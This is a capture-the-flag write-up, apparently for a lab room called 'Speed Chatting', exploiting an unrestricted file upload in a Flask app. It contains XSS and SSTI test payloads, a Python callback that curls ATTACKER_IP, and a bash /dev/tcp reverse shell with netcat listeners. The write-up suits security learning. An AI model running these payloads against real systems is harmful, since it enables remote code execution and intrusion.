<img width="100" height="100" alt="image" src="https://github.com/user-attachments/assets/808ba793-9e97-443b-9320-c3b6c745d1ae" />

# Speed Chatting
Can you hack as fast as you can chat?

## Target Enumeration

Initial reconnaissance against the target revealed a Flask application running on port `5000`.

```bash
curl -I http://10.48.187.38:5000
```

Response:

```http
HTTP/1.1 200 OK
Server: Werkzeug/3.1.5 Python/3.10.12
Date: Fri, 08 May 2026 00:47:18 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 12989
Connection: close
```

The `Werkzeug` header strongly suggested a Python Flask application.

---

# Directory Enumeration

After fuzzing/enumeration, the following interesting endpoints were discovered:

```text
/api/messages
/api/send_message
/upload_profile_pic
/uploads
```

## Initial Observations

### `/upload_profile_pic`

* Allowed unrestricted file uploads
* No validation on extension/content
* Uploaded files were stored inside:

```text
/uploads
```

This immediately became the primary attack surface.

---

# Initial Exploitation Attempts

Several common web exploitation techniques were attempted first.

---

## SSTI Testing

Since the backend was Flask/Jinja2, SSTI was tested by uploading HTML payloads containing Jinja expressions.

Example payloads:

```html
{{7*7}}
```

```html
{{config.items()}}
```

No payloads executed and uploaded files were rendered as static content.

Result:

* No SSTI

---

# XSS Testing

The messaging functionality was also tested.

Endpoints:

```text
/api/messages
/api/send_message
```

Payloads included:

```html
<script>alert(1)</script>
```

```html
<img src=x onerror=alert(1)>
```

No execution occurred.

Possible reasons:

* Output encoding
* Sanitization
* Messages rendered safely

Result:

* No XSS

---

# Re-evaluating the Upload Functionality

After spending significant time testing frontend vectors, attention returned to the unrestricted file upload.

Key realization:

* The server was running Python
* Flask applications commonly mishandle uploaded files
* Uploaded files might later be processed/imported/executed server-side

At this stage, a blind attack strategy was considered.

---

# Blind RCE Discovery

Instead of trying visible payloads, a Python file was uploaded that would trigger outbound network traffic to the attack machine.

The idea was simple:

* If the server executed the uploaded file in any way,
* it would connect back to the attacker.

---

# Blind Callback Payload

A simple Python payload was created to verify code execution.

Example:

```python
import os
os.system("curl http://ATTACKER_IP")
```

A local HTTP listener was started on the attacker machine:

```bash
python3 -m http.server 80
```

or alternatively:

```bash
nc -lvnp 80
```

After uploading the malicious Python file, a callback was received.

This confirmed:

* The uploaded file was being executed server-side
* Remote Code Execution existed
* The vulnerability was blind

---

# Reverse Shell Exploitation

After confirming code execution, the payload was upgraded to a reverse shell.

Example payload:

```python
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'")
```

A listener was started:

```bash
nc -lvnp 4444
```

After triggering the payload, a shell was received.

---

# Shell Access


```bash
cat flag.txt
```
